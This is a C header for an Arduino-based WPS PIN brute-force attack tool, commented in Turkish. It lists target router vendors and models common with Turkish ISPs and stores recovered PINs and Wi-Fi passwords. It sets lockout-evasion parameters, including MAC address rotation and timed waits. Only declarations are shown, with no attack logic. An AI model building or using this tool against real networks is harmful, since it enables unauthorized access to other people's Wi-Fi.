#ifndef WPS_ATTACK_H
#define WPS_ATTACK_H

#include <Arduino.h>

// ─── Ayarlar ──────────────────────────────────────────────────────────────────
#define WPS_MAX_TARGETS        20
#define WPS_PIN_TIMEOUT_MS     6000    // Her PIN denemesi için maks süre (ms)
#define WPS_LOCKOUT_THRESHOLD  3       // Ardışık bu kadar hızlı fail → lockout sayılır
#define WPS_LOCKOUT_DELAY_MS   35000   // Lockout sonrası bekleme (ms)
#define WPS_MAC_ROTATE_EVERY   7       // Her N denemede bir MAC rotasyonu

// ─── Vendor kimlikleri ─────────────────────────────────────────────────────────
// Modem üreticileri
// Router üreticileri
enum wps_vendor_t {
  VENDOR_UNKNOWN  = 0,
  // ── Modem üreticileri (ISP dağıtımı) ────────────────────────────────────
  VENDOR_ZTE,         // TTNET VDSL/Fiber  — ZXHN H108N, H168N, F660
  VENDOR_HUAWEI,      // TTNET Fiber ONT   — HG8245, HG8247, B315, B525
  VENDOR_ZYXEL,       // Superonline/TTNET — VMG, AMG, NBG, P serisi
  VENDOR_TPLINK,      // Her operatör      — TL-WR, Archer, Deco
  VENDOR_SAGEMCOM,    // TTNET Fiber       — F@st 3686, F@st 3890
  VENDOR_ARCADYAN,    // Vodafone TR       — VGV752, VGV7519
  VENDOR_DLINK,       // Tüketici          — DIR, DWR, DSL serisi
  VENDOR_NETGEAR,     // Tüketici          — R/C/D/Nighthawk serisi
  // ── Router üreticileri (tüketici/SOHO) ──────────────────────────────────
  VENDOR_ASUS,        // Gaming/Ev router  — RT-AC, RT-AX, RT-N, GT serisi
  VENDOR_LINKSYS,     // Ev/SOHO router    — WRT, EA, MR, Velop serisi
  VENDOR_BELKIN,      // Bütçe router      — F7D, F9K, AC serisi
  VENDOR_TENDA,       // Bütçe router      — AC, F, N serisi (TR'de çok yaygın)
  VENDOR_MERCUSYS,    // TP-Link alt marka — MW, MR serisi (TR'de çok yaygın)
  // ── Genişletilmiş vendor listesi ────────────────────────────────────────
  VENDOR_TECHNICOLOR, // Thomson/Technicolor ISP modemleri — TG, DGA serisi
  VENDOR_FRITZ,       // AVM Fritz!Box      — 7490, 7590, 6890 serisi
  VENDOR_ARRIS,       // Arris/Motorola     — SBG, TG, CM kablo modemler
  VENDOR_XIAOMI,      // Xiaomi Mi Router   — AX, AC, 4A serisi
  VENDOR_BUFFALO,     // Buffalo            — WHR, WSR, WZR serisi
  VENDOR_MIKROTIK,    // MikroTik           — hAP, RB, Audience serisi
  VENDOR_COMPAL,      // Compal ISP OEM     — CH7465, CH7466 serisi
  VENDOR_SERCOMM,     // Sercomm ISP OEM    — Vodafone/Turkcell branded
  VENDOR_NETIS,       // Netis/Wavlink      — WF, N serisi bütçe router
  VENDOR_CISCO,       // Cisco ISP          — DPC, EPC, ISB kablo serisi
  VENDOR_SAGEM,       // Sagem/Sagemcom eski— F@st 1500, 2604, 3504 serisi
  VENDOR_COMTREND,    // Comtrend ISP       — AR, VR, CT serisi
  VENDOR_ACTIONTEC,   // Actiontec ISP      — GT701, MI424, C1000 serisi
  VENDOR_GEMTEK,      // Gemtek ISP OEM     — Turkcell/TTNet branded
  VENDOR_ISKRATEL,    // Iskratel           — Si2000, Innbox serisi
};

struct wps_target_t {
  char       ssid[33];
  uint8_t    bssid[6];
  int        channel;
  int32_t    rssi;
  wps_vendor_t vendor;
};

enum wps_state_t {
  WPS_IDLE,
  WPS_SCANNING,
  WPS_ATTACKING,
  WPS_LOCKED_OUT,   // AP rate-limit / lockout tespit edildi
  WPS_SUCCESS,
  WPS_EXHAUSTED,
  WPS_STOPPED,
};

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
extern wps_target_t wps_targets[];
extern int          wps_target_count;
extern wps_state_t  wps_attack_state;
extern int          wps_attempt;
extern int          wps_total;
extern char         wps_current_pin[9];
extern char         wps_found_pin[9];
extern char         wps_found_ssid[33];
extern char         wps_found_pass[65];
extern char         wps_vendor_name[32];   // Tespit edilen vendor adı (UI için)
extern uint8_t      wps_current_mac[6];    // Aktif STA MAC (rotasyon takibi için)
extern int          wps_lockout_count;     // Toplam lockout sayısı

// ─── Fonksiyonlar ─────────────────────────────────────────────────────────────
void wps_scan();
void wps_start_attack(int target_index);
void wps_stop();
void wps_loop();

#endif
